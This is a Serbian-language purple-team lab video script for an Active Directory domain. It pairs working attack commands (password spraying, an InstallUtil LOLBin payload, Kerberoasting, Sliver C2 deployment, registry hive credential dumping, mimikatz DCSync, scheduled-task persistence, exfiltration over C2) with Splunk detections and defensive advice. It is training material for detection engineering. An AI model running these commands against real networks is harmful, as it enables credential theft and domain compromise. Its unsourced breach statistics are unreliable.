# Purple Team Home Lab — Video Narativ (Enhanced)

**Projekat:** Purple LAB — SOC Analyst Level 2  
**Format:** 10 segmenata (8 napadačkih + Splunk Dashboard Tour + Production Hardening bonus)  
**Cilj:** Demonstrirati dubinu razumevanja AD security i detection engineering  
**Deliverable:** Primarni deliverable je GitHub repo (README + detekcije kao kod), skenira se za ~2 min; ovaj narativ je opcioni video deep-dive. Preporučeni ~1h highlight cut: Seg 4, 6, 8, 9, 10.

---

## STRUKTURA SVAKOG SEGMENTA

Svaki segment ima 4 dela:
1. **Hook** — šta ćemo videti i zašto je važno
2. **Execution** — komande i tehničko izvršenje
3. **Detection** — Splunk strana
4. **Pro Tips** — enterprise wisdom drops

---

## SEGMENT 1 — Lab Setup & Recon (15-20 min)

### Hook — Uvod

> "Dobrodošli u Purple Team Home Lab. Ovo nije samo demonstracija alata — ovo je razmišljanje SOC L2 analitičara. Za svaki napad koji ćete videti, paralelno ćemo gledati kako blue team to detektuje, i šta bi propustili sa default konfiguracijom."

> "Lab arhitektura — 5 mašina. HYDRA-DC Windows Server 2022 Domain Controller, MARVEL.LOCAL domena. THEPUNISHER i SPIDERMAN endpointi. Kali napadač. Splunk SIEM. Defender ostaje uključen kroz ceo lab — cilj je realan enterprise scenario, ne demo sa isključenim AV-om."

### DC — AD korisnici

*Pokreni:*
```powershell
Get-ADUser -Filter * -Properties MemberOf | Select-Object SamAccountName, @{N="Groups";E={$_.MemberOf -join ", "}}
```

> "7 korisnika. SQLService, fcastle, tstark — svi Domain Admins. pparker — obični Domain User. Setite se ovih naloga, vraćaćemo se na njih."

#### 🎯 Pro Tip #1 — Default LDAP permisije
> "Ovo je nešto što ne ide samo na ekranu. U realnom enterprise-u, čim dobijete pristup bilo kom domain user nalogu, ovaj query je prvi korak. Domain Users grupa ima default 'Read All Properties' permisiju na svim user objektima — to je dizajnerska odluka Microsoft-a iz 2000-tih koja se nikad nije promenila. Drugim rečima — svaki authenticated user može da pročita gotovo sve atribute drugih korisnika. To je razlog zašto SQLService description sa lozinkom, koji ćemo videti u Fazi 4, predstavlja kritičnu ranjivost."

### Splunk — baseline

```spl
| metadata type=hosts
| table host, recentTime
```

> "Sva tri Windows hosta aktivna, svezi timestampovi. Forwarderi rade, Sysmon šalje, Security log stiže. Lab je spreman."

### Kali — nmap

```bash
nmap -sV 192.168.182.0/24
```

> "5 živih hostova. Na DC vidim port 88 — Kerberos. 389 — LDAP. 636 — LDAPS. To je AD fingerprint koji nigde ne možete sakriti — Kerberos i LDAP moraju biti dostupni svim domain-joined mašinama."

> "Pažnja — port 445 na DC nije dostupan sa Kali. Firewall filtrira. To znači da impacket-secretsdump ili DCSync sa Kali neće raditi direktno. Moraćemo da se probijemo kroz endpoint."

#### 🎯 Pro Tip #2 — Nmap je glasan
> "Sam fakt da nmap -sV vraća čistu sliku govori da nema NDR rešenja — Network Detection and Response. U realnom enterprise-u, ovakav -sV sweep bi se odmah prikazao u Suricata ili Zeek logovima. Nmap -sV šalje banner grabbing pakete koji su detektabilni. Ozbiljniji napadač bi koristio passive recon — DNS enumeration, Shodan, certificate transparency logovi — pre nego što počne aktivni skener."

### nxc smb / nxc ldap

```bash
nxc smb 192.168.182.135
nxc ldap 192.168.182.135 -u '' -p '' --users
```

> "SMB timeout — port blokiran. LDAP anonymous bind ne vraća korisnike — autentifikacija potrebna. Dva sigurnosna podešavanja koja većina starih AD instalacija nije imala."

### Kerbrute userenum

```bash
cd ~/kerbrute && ./kerbrute userenum --dc 192.168.182.135 -d MARVEL.LOCAL users_clean.txt
```

> "Ali Kerberos je drugi par rukava. Kerbrute koristi pre-authentication error kodove — server vraća drugačiji error za postojećeg vs nepostojećeg korisnika. Dizajn protokola, ne bug. Nemoguće zatvoriti."

> "6 validnih korisnika potvrđeno — bez ijednog 4625 NTLM failed-logon eventa, jer kerbrute ide kroz Kerberos AS-REQ, ne NTLM. Ali pažnja za blue team: za NEpostojeće naloge DC vraća 4768 sa greškom 0x6, principal unknown — to je enumeration signature (sledeći tip). Moja lista je bila čista, sami postojeći nalozi, pa nema 0x6."

#### 🎯 Pro Tip #3 — Kerbrute detection
> "Kerbrute je tih, ali ne nevidljiv. Na DC-u, EC4768 sa failure code 0x6 — Client not found in Kerberos database — je signature za userenum. Većina SIEM-ova ne alertira na 4768, samo na 4625 — što je greška. Ako vidite 100+ EC4768 sa failure 0x6 iz jedne IP adrese u minuti, to je kerbrute ili sličan alat. Ovo je detection gap koji mali SOC timovi propuštaju."

### ASREPRoast

```bash
impacket-GetNPUsers MARVEL.LOCAL/ -dc-ip 192.168.182.135 -no-pass -usersfile users_clean.txt
```

> "Nijedan korisnik nema UF_DONT_REQUIRE_PREAUTH zastavicu. ASREPRoast nije moguć — dobra konfiguracija."

#### 🎯 Pro Tip #4 — ASREPRoast prevalence
> "ASREPRoast je low-hanging fruit koji je još uvek živ u 30% enterprise mreža. Razlog — kompatibilnost sa starim Java legacy aplikacijama iz 2005-2010. Detection je trivijalan — scheduled report koji lista sve korisnike sa DONT_REQ_PREAUTH bit-om u userAccountControl atributu. Trebalo bi da bude nedeljna provera u svakom SOC-u."

### Certipy — AD CS

```bash
certipy-ad find -u fcastle@MARVEL.LOCAL -p Password1 -dc-ip 192.168.182.135
```

> "33 šablona, 11 omogućeno. CA — MARVEL-HYDRA-DC-CA. SubCA template ima ESC1, ESC2, ESC3, ESC15 ranjivosti."

#### 🎯 Pro Tip #5 — AD CS statistika
> "AD CS je verovatno najmanje razumevan deo Active Directory ekosistema. SpecterOps je 2021. objavio Certified Pre-Owned istraživanje sa 8 ESC ranjivosti. Po njihovim podacima, 55% enterprise mreža ima ESC1 misconfiguraciju — 'Enrollee Supplies Subject' bez 'Manager Approval'. To je direktan path do Domain Admin u jednom HTTPS zahtevu. U našem labu, port 445 blokira eksploataciju, ali ranjivost postoji. Blue team akcija — Certipy find scan bi trebalo da bude deo kvartalnog security review-a."

### Transition

> "Faza 1 završena. Recon kompletan — znamo strukturu, korisnike, ranjivosti. Nemam lozinku. Sledeći korak — password spraying."

---

## SEGMENT 2 — Initial Access (10-15 min)

### Hook

> "Password spray je najtiša tehnika za probijanje u AD. Brute force udara jednog usera sa 1000 lozinki — okida lockout posle 5. Spray udara 1000 usera sa jednom lozinkom — ne okida ništa."

### Pre-spray — lockout check

```bash
nxc smb 192.168.182.135 -u fcastle -p Password1 --pass-pol
```

> "Pre spray-a — proveravam lockout polisu. Ne želi se zaključavanje naloga."

#### 🎯 Pro Tip #6 — Lockout anatomija
> "Lockout polisa ima tri parametra. Account Lockout Threshold — koliko failed pokušaja pre lockout-a. Reset Account Lockout Counter After — koliko vremena bez pokušaja resetuje brojač. Lockout Duration — koliko traje zaključavanje. Ako je threshold 5 a reset interval 30 minuta, mogu da pošaljem 4 pokušaja, sačekam 31 minut, i tako u nedogled. Majority enterprise ima threshold 5-10 sa resetom 30 minuta — što daje napadaču prostor za spray sa dovoljnim kašnjenjem."

### Kerbrute passwordspray

```bash
./kerbrute passwordspray --dc 192.168.182.135 -d MARVEL.LOCAL users_clean.txt 'Password1' --delay 100
```

> "Spray sa Password1. fcastle:Password1 — pogodak. Guest greška zbog disabled statusa — očekivano."

#### 🎯 Pro Tip #7 — Spray kandidati
> "Lista lozinki koje napadač proba nisu nasumične. Top spray kandidati — Welcome1, Password123, Season+Year kombinacije (Spring2025, Summer2025), i ime kompanije + broj. Mandiant izveštaj iz 2024 — 23% uspešnih inicijalnih pristupa u enterprise-ima je kroz password spray. Detection — više različitih usera sa failed logon iz iste IP adrese u kratkom periodu, plus jedan success, to je spray signature. Fokus nije na broju failova, nego na broju različitih korisnika."

### Splunk detekcija

```spl
index=main source="WinEventLog:Security" EventCode=4771
| rex field=Message "Client Address:\s*::ffff:(?<src_ip>[^\r\n]+)"
| rex field=Message "Account Name:\s*(?<username>[^\r\n]+)"
| table _time, src_ip, username
| sort - _time
```

> "EC4771 — svi neuspeli pokušaji iz iste IP adrese u sekundi. Klasičan spray pattern."

#### 🎯 Pro Tip #8 — IPv6 notacija u Splunk
> "Pažnja na ::ffff: prefiks ispred IP adrese. To je IPv4-mapped IPv6 notacija. Windows kada loguje source IP koristi dual-stack format čak i kada je konekcija pravi IPv4. Ako napišete regex bez ::ffff: parsing-a, dobijate prazne src_ip polje. Ovo je klasičan gotcha za junior analitičare koji prave prve SPL upite. Uvek koristite rex sa ::ffff: pattern-om za Security log IP polja. U produkciji bih koristio TA-extracted polje Client_Address — Splunk Add-on for Windows ga već parsira; rex ovde namerno pokazuje da razumem sirovi event, ne da je rex pravi način."

```spl
index=main source="WinEventLog:Security" EventCode=4768
| rex field=Message "Account Name:\s*(?<username>[^\r\n]+)"
| table _time, src_ip, username
```

> "EC4768 — TGT issued za fcastle. Uspešna autentifikacija odmah posle niza failova sa istog IP-a. Spray pogodak."

### BloodHound

```bash
bloodhound-python -c All -u fcastle -p Password1 -d MARVEL.LOCAL -ns 192.168.182.135
ls -la *.json
```

> "Sa kompromitovanim nalogom — full domain enumeration. 8 korisnika, 3 kompjutera, 52 grupe. JSON fajlovi za BloodHound vizualizaciju attack path-ova."

#### 🎯 Pro Tip #9 — BloodHound queries
> "BloodHound je revolucionisao AD attack methodology 2016. Tri query-ja koje hiring manageri vole da čuju da znate — Shortest Path to Domain Admins, Find Principals with DCSync Rights, i Find Kerberoastable Users with Most Privileges. Poslednja je posebno važna jer direktno otkriva SQLService i slične naloge koji su Domain Admin + imaju SPN. Kombinacija koja garantuje uspešan kompromis."

### Transition

> "Imam credentials. Imam mapu domene. Sledeći korak — code execution na endpoint-u bez okidanja Defendera."

---

## SEGMENT 3 — Execution / LOLBins (10-15 min)

### Hook

> "Defender se aktivira na poznate signature. PowerShell ima AMSI integraciju — svaki script block se skenira pre izvršenja. Ali Microsoft signed binary? Tu Defender oklevа."

### Payload (Kali)

```bash
cat > /tmp/Punisher.cs << 'EOF'
using System;
using System.Configuration.Install;
using System.Diagnostics;
using System.Runtime.InteropServices;
[System.ComponentModel.RunInstaller(true)]
public class Punisher : Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Process.Start("cmd.exe", "/c whoami > C:\\Temp\\pwned.txt && hostname >> C:\\Temp\\pwned.txt");
    }
}
EOF
mcs -target:library -r:/usr/lib/mono/4.5/System.Configuration.Install.dll /tmp/Punisher.cs -out:/tmp/share/GlobalProtect_Update.dll
```

> "Kompajliram .NET DLL. Ime — GlobalProtect_Update.dll. Izgleda kao Palo Alto VPN update. Masquerading je ozbiljna disciplina."

#### 🎯 Pro Tip #10 — LOLBins familija
> "InstallUtil je jedan iz familije .NET LOLBins. MSBuild može da izvršava XML projektne fajlove sa inline kodom — bez kompajliranja. RegAsm i RegSvcs izvršavaju .NET assembly kroz COM registraciju. Sve su Microsoft signed, dolaze sa svakim Windowsom, mogu da izvrše proizvoljan kod. LOLBAS projekat na GitHub-u ima preko 200 takvih binarnih fajlova. Ovo je razlog zašto Application Allowlisting po samim signature-ima nije dovoljno — mora biti per-path i per-behavior."

### Delivery i izvršavanje

```cmd
copy \\192.168.182.133\share\GlobalProtect_Update.dll C:\Temp\GlobalProtect_Update.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Temp\GlobalProtect_Update.dll
type C:\Temp\pwned.txt
```

> "Payload izvršen. Defender nije reagovao — InstallUtil je trusted binary, DLL je u C:\Temp exclusion path-u."

#### 🎯 Pro Tip #11 — Zašto /U flag
> "Zašto baš /U flag, a ne default install? Default install poziva Install metodu koja prolazi kroz pre-flight checkove. /U direktno poziva Uninstall metodu — manje code paths, manje šansi da AMSI uhvati signature. Semantički je i manje sumnjivo — 'odjavljujem softver' je ređi security alert nego 'instaliram softver'. Detalji ovog tipa razdvajaju poznavanje alata od razumevanja kako alati rade."

### Splunk detekcija

```spl
index=main source="WinEventLog:Security" EventCode=4688 host=THEPUNISHER
| rex field=Message "New Process Name:\s*(?<process>[^\r\n]+)"
| rex field=Message "Process Command Line:\s*(?<cmdline>[^\r\n]+)"
| search process="*InstallUtil*"
| table _time, process, cmdline
```

```spl
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 host=THEPUNISHER
| rex field=Message "ParentImage:\s*(?<parent>[^\r\n]+)"
| rex field=Message "Image:\s*(?<process>[^\r\n]+)"
| rex field=Message "CommandLine:\s*(?<cmdline>[^\r\n]+)"
| search parent="*InstallUtil*"
| table _time, parent, process, cmdline
```

> "EC4688 — InstallUtil sa command line. Sysmon EC1 — parent-child chain, InstallUtil spawns cmd.exe. To je signature koji nijedan legitiman InstallUtil ne ostavlja."

#### 🎯 Pro Tip #12 — EC4688 vs Sysmon EC1
> "Dva process creation event-a — različite informacije. EC4688 iz Windows Security Auditing zahteva da Command Line logging bude eksplicitno uključen kroz GPO — default je OFF. Sysmon EC1 uvek ima command line, plus parent process, plus image hash, plus process GUID za korelaciju. Sysmon je superiorniji za detection engineering. Ali EC4688 dolazi bez Sysmon instalacije — što je važno za endpoint-e gde Sysmon nije deployovan. Idealni SOC ima oboje."

### Transition

> "Imam code execution. Treba mi nešto vrednije — privilegovani credentials. Faza 4 — Kerberoasting."

---

## SEGMENT 4 — Kerberoasting (10-15 min) ⭐ KLJUČNI SEGMENT

### Hook

> "Kerberoasting je 2014. otkrio Tim Medin. Jedan od najstarijih, najpoznatijih napada na AD. I još uvek radi. 70% domena ima bar jedan kerberoastable nalog po penetration testing statistikama."

### Pre-roast — description ranjivost

> "Pre hashcat-a, pametan napadač pregleda mete."

```powershell
Get-ADUser SQLService -Properties Description | Select-Object SamAccountName, Description
```

*Output: "SQL Service Account. Password: MYpassword123#"*

> "I to je to. Nije mi potreban hashcat. Lozinka je u description polju, vidljiva svakom autentifikovanom korisniku u domeni."

#### 🎯 Pro Tip #13 — CENTRALNA POENTA — Description ranjivost
> "Ovo je nešto što se dešava u realnom svetu češće nego što biste poverovali. Sysadmin pravi service nalog 2015. godine, ostavlja lozinku u description 'da se podseti'. Prođe 9 godina. Niko ne menja, niko ne pregleda."

> "Domain Users ima default Read All Properties na svim user objektima — pominjao sam u Segmentu 1. Svaki domain user čita description svakog drugog korisnika."

> "Tri preporuke za blue team. Prvo — scheduled weekly report koji pretražuje sve user objekte za ključne reči 'password', 'pwd', 'pass' u description, info, comment poljima. Drugo — Group Managed Service Accounts tamo gde je moguće — Windows automatski rotira lozinku, nikad nije human-readable. Treće — restriktivniji ACL na osetljivim service nalozima."

> "Nastavljamo sa klasičnim Kerberoasting napadom — kao da nismo videli description."

### Kerberoasting

```bash
impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -request -outputfile /tmp/kerberoast.hashes
hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force
```

> "TGS hash dobijen. Encryption type 0x17 — RC4-HMAC. Hashcat — 17 sekundi. MYpassword123# — ista lozinka iz description."

#### 🎯 Pro Tip #14 — RC4 vs AES
> "Encryption type 0x17 je RC4-HMAC. Moderni Windows podržava AES-128 i AES-256 — kodovi 17 i 18. Ako je msDS-SupportedEncryptionTypes atribut na user nalogu prazan, default je RC4 zbog backward kompatibilnosti. Hashcat krekuje RC4 višestruko brže od AES-256. Blue team fix — eksplicitno postaviti msDS-SupportedEncryptionTypes = 0x18 na sve service naloge, što forsira AES enkripciju TGS ticketa."

#### 🎯 Pro Tip #15 — Zašto slabe lozinke na service nalozima
> "Tri razloga iz prakse. Prvo — manuelna rotacija. Sysadmin postavi lozinku 2018, nikad se ne menja. Drugo — PasswordNeverExpires zastavica je gotovo uvek postavljena na service nalozima — vidi se u userAccountControl bit 16. Treće — nedostatak PAM rešenja kao CyberArk ili BeyondTrust koja automatski rotiraju lozinke. PAM košta, mali enterprise-i ga preskaču. Rezultat — service nalozi sa SPN-om, Domain Admin membershipom, i password koji je nikad nije rotiran su najčešći put do Domain Admin kompromisa."

### Splunk detekcija

```spl
index=main source="WinEventLog:Security" EventCode=4769
| rex field=Message "Ticket Encryption Type:\s*(?<enc_type>[^\r\n]+)"
| where enc_type="0x17"
| search NOT service="krbtgt"
| table _time, username, service, enc_type
```

> "EC4769 sa 0x17 — high-fidelity alert. Svaki RC4 TGS za user account zaslužuje istragu."

#### 🎯 Pro Tip #16 — Tuning za legacy
> "False positive challenge — legacy aplikacije. Stari SQL Server 2008, Oracle pre 12c — koriste RC4. Tuning pristup — allowlist legacy service naloga koji legitimno koriste RC4, sve van liste je alert. Threshold based — više od 5 RC4 TGS request-ova u 5 minuta od istog source-a je mass kerberoasting, ne legacy aplikacija."

### Transition

> "Domain Admin credentials u džepu. Treba mi persistent pristup. Faza 5 — C2 implant."

---

## SEGMENT 5 — Lateral Movement & C2 (15-20 min)

### Hook

> "Sliver je open-source C2 framework koji je 2019. demokratizovao C2 infrastrukturu. Pre Sliver-a — Cobalt Strike sa licencom od 5800 dolara. Sada — besplatan, modularan, jednako moćan."

#### 🎯 Pro Tip #17 — Sliver threat intel
> "Iz threat intel perspektive — Sliver detekcije su porasle 300% u 2023 prema Mandiant-u. Ransomware grupe ga koriste jer je Cobalt Strike skup i njegovi network signature su previše poznati. Default Sliver beacon ima detektabilne JA3 hash-ove. Ali advanced actors recompile Sliver agent sa custom certificate templates i menjaju User-Agent stringove. Detection mora biti behavior-based, ne signature-based."

### Setup i deployment

```
# Sliver konzola
mtls --lport 443
generate --mtls 192.168.182.133:443 --os windows --arch amd64 --format exe --save /tmp/
```

```cmd
C:\Temp\GlobalProtect_Update.exe
```

```
sessions
use <session_id>
shell
```

```powershell
Test-NetConnection -ComputerName 192.168.182.135 -Port 445
Test-NetConnection -ComputerName 192.168.182.135 -Port 135
```

> "C2 sesija aktivna. Sa THEPUNISHER mogu na DC port 445 i 135 — što sa Kali nije bilo moguće. Ovo je lateralni pokret."

#### 🎯 Pro Tip #18 — Network segmentacija realnost
> "Network segmentation je teorija koja se često ne implementira. Većina enterprise mreža je flat interno — sve workstation-e mogu na DC, sve na sve. Mikrosegmentacija postoji u finansijskim institucijama i defense kontraktorima. U 90% kompanija ne postoji. Ovo je razlog zašto lateralno pomeranje uvek ide kroz endpoint pivot — egress filter na perimeter firewall-u možda blokira spoljni saobraćaj, ali internal east-west saobraćaj je slobodan."

#### 🎯 Pro Tip #19 — Zašto mTLS
> "Zašto mTLS, a ne plain HTTPS? Mutual TLS znači da server validira klijent sertifikat, i klijent validira server. TLS inspection proxy mora da ima privatni ključ od server sertifikata, što ne može. To je razlog zašto enterprise TLS inspection ne funkcioniše na mTLS — Sliver to koristi kao defense feature. Iz SOC perspektive — jedini način da detektujete mTLS C2 koji nema poznati signature je behavioral analysis, ne signature matching."

### Detection

```spl
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 host=THEPUNISHER
| rex field=Message "Image:\s*(?<process>[^\r\n]+)"
| rex field=Message "DestinationIp:\s*(?<dst_ip>[^\r\n]+)"
| search process="*Temp*"
| table _time, process, dst_ip, dst_port
```

> "EC3 — beaconing pattern iz C:\Temp. Regularni intervali — C2 heartbeat. Ovaj detection radi jer smo prethodno popravili Sysmon config. Prikazaću zašto default config to nije hvatao — u Segmentu 8."

### Transition

> "Persistent C2 radi. Sada — credential dump sa kompromitovane mašine."

---

## SEGMENT 6 — Credential Dumping (15-20 min)

### Hook

> "Credential dumping je phase 6 u Cyber Kill Chain. Mimikatz je 2011. revolucionisao ovu fazu. 14 godina kasnije, Microsoft je naučio. Danas pokazujem šta prolazi, šta ne prolazi, i zašto."

### SAM hive dump

```cmd
net use \\192.168.182.135\IPC$ /user:MARVEL\fcastle Password1
reg save HKLM\SAM C:\Temp\sam.hive /y
reg save HKLM\SYSTEM C:\Temp\system.hive /y
reg save HKLM\SECURITY C:\Temp\security.hive /y
```

> "reg.exe je legitiman Windows alat. Defender ga ne blokira. Ali kombinacija reg + save + SAM/SYSTEM/SECURITY u kratkom periodu je crveni alarm za svaki dobro podešen SIEM."

#### 🎯 Pro Tip #20 — Tri hive-a anatomija
> "Zašto baš ova tri hive-a? SAM sadrži lokalne user NT hasheve. SYSTEM ima bootKey koji dekriptuje SAM — bez njega SAM je beskoristan. SECURITY sadrži LSA secrets — cached domain credentials, machine account hash, DPAPI master keys. Ova tri zajedno daju kompletan credential dump bez ijedne linije Mimikatz koda. To je razlog zašto reg save kombinacija mora biti detection priority — ne samo jedan fajl u izolaciji."

### Secretsdump

```bash
sudo impacket-secretsdump -sam /tmp/share/sam.hive -system /tmp/share/system.hive -security /tmp/share/security.hive LOCAL
```

> "Lokalni Administrator NT hash. frankcastle hash. SUPERMAN hash. Cached domain credentials za MARVEL\Administrator i fcastle. DPAPI master key, NL$KM ključ."

#### 🎯 Pro Tip #21 — Cached credentials implikacije
> "Cached domain credentials su posebno interesantni. Windows kešira poslednjih 10 domain logon-a u SECURITY hive-u — da biste mogli da se prijavite na laptop offline. Ali to znači da laptop CEO-a koji se jednom prijavljivao na THEPUNISHER ima njegov cached hash. DCC2 format je otporniji od NTLM — ali brute-force je moguć. Defense — Group Policy 'Interactive logon: Number of previous logons to cache' na 0, ali tada offline logon ne radi. Klasičan security vs usability kompromis koji svaki SOC L2 treba da razume."

### DCSync pokušaj — Defender blokira

```cmd
# Kroz Sliver shell
C:\Temp\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:MARVEL.LOCAL" "exit"
```

*Output: "This script contains malicious content and has been blocked by your antivirus software."*

> "AMSI blokirao. String lsadump::dcsync uhvaćen kroz PowerShell engine pre izvršenja."

#### 🎯 Pro Tip #22 — AMSI arhitektura
> "AMSI — Antimalware Scan Interface — je bridge između PowerShell engine-a i AV-a. Kada PowerShell učita script block, pre izvršenja šalje ga kroz AMSI API. AV dobija plaintext, ne enkodovan string. Renaming Mimikatz binarnog ne pomaže — AMSI hvata strings u memoriji runtime. Bypass tehnike postoje — patching AmsiScanBuffer funkcije u memoriji, in-memory loading, custom-compiled variante. Ali svaki bypass je race against signatures. Defense in Depth uzima vreme napadaču."

### Zašto DCSync ne radi ni bez Defendera

> "Čak da Mimikatz prošao Defender — fcastle nema 'Replicating Directory Changes' privilegije."

#### 🎯 Pro Tip #23 — Defense in Depth poruka
> "Ovo je klasičan primer Defense in Depth. Tri sloja odbrane zaustavila su napad na domain kompromis. Sloj 1 — endpoint protection blokira Mimikatz signature. Sloj 2 — AD permisije ograničavaju ko može DCSync. Sloj 3 — SACL auditing koji bi generisao EC4662 sa replication GUID-ovima. Hiring manager pita 'kako bi zaštitili od DCSync-a' — odgovor nije jedan alat već pet preklapajućih kontrola. To je ono što odvaja L2 od L1."

> "Na videu prikazujem i Event Viewer lokalno — EC1116 i EC1117 — koji potvrđuju Defender blokadu. U produkcijskom okruženju ovo bi išlo direktno u SIEM."

### Splunk detekcija

```spl
index=main source="WinEventLog:Security" EventCode=4688 host=THEPUNISHER
| rex field=Message "Process Command Line:\s*(?<cmdline>[^\r\n]+)"
| search cmdline="*reg*save*" (cmdline="*SAM*" OR cmdline="*SYSTEM*" OR cmdline="*SECURITY*")
| table _time, cmdline
```

> "Sve reg save komande u Splunk-u. Detection rule treba da pita — koliko često legitimno bekapujete SAM+SYSTEM+SECURITY u istih 5 sekundi? Odgovor — nikad, osim enterprise backup softvera koji je whitelistable."

### Transition

> "Credential dump kompletiran. Sada — osiguravamo da implant preživi reboot."

---

## SEGMENT 7 — Persistence (10-15 min)

### Hook

> "Persistence je MITRE TA0003. Sve tehnike koje omogućavaju da implant preživi reboot, logoff, ili pokušaj uklanjanja. T1053.005 — Scheduled Task — je najčešće korišćena tehnika u 2023. i 2024. po MITRE ATT&CK retrospektivi."

### Scheduled task

```cmd
schtasks /create /tn "WindowsUpdateService" /tr "C:\Temp\GlobalProtect_Update.exe" /sc onlogon /ru SYSTEM /f
schtasks /query /tn "WindowsUpdateService"
```

> "Task name — WindowsUpdateService. Masquerading. Logon trigger, running as SYSTEM."

#### 🎯 Pro Tip #24 — Masquerading discipline
> "Masquerading je ozbiljna disciplina. WindowsUpdateService je dobar izbor — Windows ima 50+ task-ova sa sličnim imenima. Slabe odluke napadača su 'UpdateTask123' ili 'MyTask' — instant red flag. Pravilo — ime mora biti verodostojno za ekosistem. Na Windows-u — WindowsUpdate, Adobe, NVIDIA, Dell su sve legitimna task name-space-ovi. Advanced actors mapiraju task ime na stvarni softver koji postoji na sistemu pre deployment-a."

#### 🎯 Pro Tip #25 — T1053.005 event sources
> "T1053.005 ima 4 različita event source-a za detection. EC4698 u Security log-u — task created. EC4702 — task updated. Sysmon EC11 — file create u C:\Windows\System32\Tasks\. Task Scheduler Operational log EC106 — task registered. Idealan SOC ima sve 4 ulogovane i correlated. Ako vidite samo EC4698, propustićete advanced technike kao task kreiranje bez logovog kreatora kroz direktnu registry manipulaciju."

#### 🎯 Pro Tip #26 — Hidden tasks
> "Hidden tasks su poseban problem. Napadač može da postavi DACL na task tako da samo SYSTEM može da ga vidi — schtasks /query ga ne vraća ni za administratore. Detection — proveriti C:\Windows\System32\Tasks\ direktno kroz file system, plus query registry pod HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree. APT29 i APT41 koriste ovaj pristup za dugoročnu persistence u high-value ciljevima."

### Splunk detekcija

```spl
index=main source="WinEventLog:Security" EventCode=4698 host=THEPUNISHER
| rex field=Message "Task Name:\s*(?<taskname>[^\r\n]+)"
| rex field=Message "Account Name:\s*(?<username>[^\r\n]+)"
| rex field=Message "<Command>(?<command>[^<]+)</Command>"
| table _time, username, taskname, command
```

> "EC4698 — task name, creator, command path. Sve u jednom event-u. XML sadržaj taska je kompletna forenzična slika."

### Transition

> "Implant preživljava reboot. Finalna faza — C2 analiza i detection gap."

---

## SEGMENT 8 — C2 + Exfiltration + Detection Engineering (15-20 min)

### Hook — Detection Gap

> "Sliver beaconing radi od Faze 5. Ali da li smo ga hvatali sa default Sysmon config-om? Ovo je srce purple team metodologije."

### Pre-fix — gap demo

```spl
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 host=THEPUNISHER
| rex field=Message "Image:\s*(?<process>[^\r\n]+)"
| search process="*GlobalProtect*"
```

> "Nula rezultata. Default Sysmon config ne hvata GlobalProtect_Update.exe beaconing. Ovo je detection gap."

#### 🎯 Pro Tip #27 — Sysmon performance trade-off
> "Default Sysmon config — SwiftOnSecurity verzija — filtrira NetworkConnect samo za poznate sumnjive procese. Razlog je performance. Windows ima desetine hiljada network konekcija dnevno samo od telemetrije i auto-update-ova. Ako Sysmon hvata sve, dobijate 1GB+ log-ova dnevno po endpoint-u. Svaki event je CPU overhead. Trade-off je svestan i dokumentovan. Ali to znači da NetworkConnect hvata samo definisani skup — sumnjiva imena procesa (cmd, certutil, powershell…) i sumnjive izvorne putanje (C:\Users, C:\ProgramData, C:\Windows\Temp). Naš implant je beaconao iz golog C:\Temp, koji u tom skupu fali. Fix nije novo ime, nego zatvaranje rupe u pokrivenosti putanja. Purple team vam pokaže tačno koju rupu imate."

### Detection engineering — fix

```xml
<!-- baseline već loguje C:\Users i C:\ProgramData; goli C:\Temp je rupa -->
<Image name="PurpleLab" condition="begin with">C:\Temp\</Image>
```

```cmd
sysmon64 -c "C:\Path\sysmonconfig-export.xml"
```

> "Jedno pravilo, po LOKACIJI a ne po imenu. SwiftOnSecurity baseline već loguje C:\Users i C:\ProgramData — ali napadač je beaconao iz golog C:\Temp, koji baseline ne pokriva. To je tačan gap: jedna linija. Da sam keyovao na ime `GlobalProtect_Update.exe`, preimenovanje binara bi me oslepelo. Fidelity diže beacon-interval analiza, ne ime. L1 IOC vs L2 behavioral detekcija."

#### 🎯 Pro Tip #28 — Purple team metodologija
> "Ovo je core purple team loop — emulate, detect, gap analysis, iterate. Nije dovoljno reći 'imamo Sysmon'. Treba simulirati realne napade, videti šta propušta, i iterativno popraviti. Zreli SOC ima formalizovan detection engineering process — nova tehnika ili novi alat se prvo emulira u lab okruženju, merimo coverage, pa se deployment radi na produkciji. Atomic Red Team projekat na GitHub-u je odlican izvor emulation test-ova."

### Exfiltration

```cmd
echo "Top secret data: customer database backup" > C:\Temp\loot.txt
```

```
download C:\\Temp\\loot.txt
```

```bash
cat ~/loot.txt
```

> "Fajl prebačen kroz isti mTLS kanal. Nema posebnog exfil kanala, nema DNS tunneling-a. Sve na port 443."

#### 🎯 Pro Tip #29 — Exfiltration detection vektori
> "Exfiltration kroz C2 kanal je teška za detekciju ali ne nemoguća. Tri vektora. Prvo — payload size anomaly. Beacon je 1-2KB, exfiltration paket je 100KB+. Statistical analysis može da otkrije. Drugo — JA3 fingerprinting. Sliver mTLS handshake ima karakteristični JA3 hash koji Zeek i Suricata loguju. Treće — duration analysis. Beacon session traje danima sa konzistentnim intervalom plus jitter. Enterprise NDR alati kao ExtraHop, Vectra, Darktrace hvataju Sliver upravo ovim pristupom — gledaju ponašanje kroz vreme, ne statičke signature."

### Post-fix detection

```spl
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 host=THEPUNISHER
| rex field=Message "Image:\s*(?<process>[^\r\n]+)"
| search process="*Temp*"
| table _time, process, dst_ip, dst_port
```

> "Sada Splunk hvata svaki beacon. Detection gap zatvoren. Ovo je purple team pobeda."

---

## SEGMENT 9 (FINALNI) — Splunk Dashboard Tour & Lessons Learned (15 min)

### Dashboard walkthrough

> "Sumarno — sve detekcije u jednom dashboardu. Svaki panel odgovara jednoj fazi napada."

### MITRE mapping

```spl
index=main source="WinEventLog:Security" earliest=-7d
| eval mitre=case(
    EventCode=4771, "T1110.003 - Password Spray",
    EventCode=4769, "T1558.003 - Kerberoasting",
    EventCode=4698, "T1053.005 - Scheduled Task",
